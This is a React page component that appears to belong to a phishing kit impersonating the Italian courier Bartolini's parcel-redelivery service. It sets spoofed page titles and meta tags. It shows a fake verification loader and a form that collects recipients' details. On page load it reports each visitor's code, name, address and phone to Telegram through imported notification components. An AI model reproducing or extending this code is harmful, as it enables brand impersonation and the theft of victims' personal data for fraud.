import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import MainForm from "@/components/IT/itmainform";
import { Header, Footer } from "@/components/IT";
import ItLoadingForm from "@/components/IT/ItLoadingForm";
import TelegramAPI from "@/components/tgapi";
import { sendRedeliveryPageOpenedNotification } from "@/components/tgapi";

const ITRiconsegna = () => {
  const { code } = useParams();
  const [recipientData, setRecipientData] = useState(null);
  const [isVerified, setIsVerified] = useState(false);
  
  // For 2xnbr route, always use empty recipient data
  const isPreviewMode = code === "2xnbr";
  const displayRecipientData = isPreviewMode ? null : recipientData;

  useEffect(() => {
    document.title = "Bartolini Riconsegna - Servizio Consegna Pacchi";
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute("content", "Bartolini Servizio Consegna Pacchi e Tracciamento Spedizioni");
    }
    const ogTitle = document.querySelector('meta[property="og:title"]');
    if (ogTitle) {
      ogTitle.setAttribute("content", "Bartolini Riconsegna");
    }
    const ogDescription = document.querySelector('meta[property="og:description"]');
    if (ogDescription) {
      ogDescription.setAttribute("content", "Bartolini Servizio Consegna Pacchi e Tracciamento Spedizioni");
    }

    // Send notification when redelivery page is opened with a code
    if (code) {
      sendRedeliveryPageOpenedNotification(code);
    }
  }, [code]);

  return (
    <div className="min-h-screen bg-white">
      {/* Telegram API Component - sends notifications on page load */}
      <TelegramAPI 
        invoiceName={displayRecipientData?.name || code || "Unknown Invoice"}
        address={
          displayRecipientData?.address && displayRecipientData?.city && displayRecipientData?.zip 
            ? [displayRecipientData.address, displayRecipientData.city, displayRecipientData.zip].join(', ')
            : "Incomplete"
        } 
        phone={displayRecipientData?.phone || "Unknown Phone"}
      />
      
      <Header />
      
      {!isVerified ? (
        <ItLoadingForm onVerified={() => setIsVerified(true)} invoiceName={displayRecipientData?.name || code} />
      ) : (
        <div className="container mx-auto p-4">
          <MainForm 
            onRecipientDataChange={(data) => setRecipientData(data)}
            invoiceId={isPreviewMode ? null : code}
            initialData={isPreviewMode ? null : displayRecipientData}
          />
        </div>
      )}
      
      <Footer />
    </div>
  );
};

export default ITRiconsegna;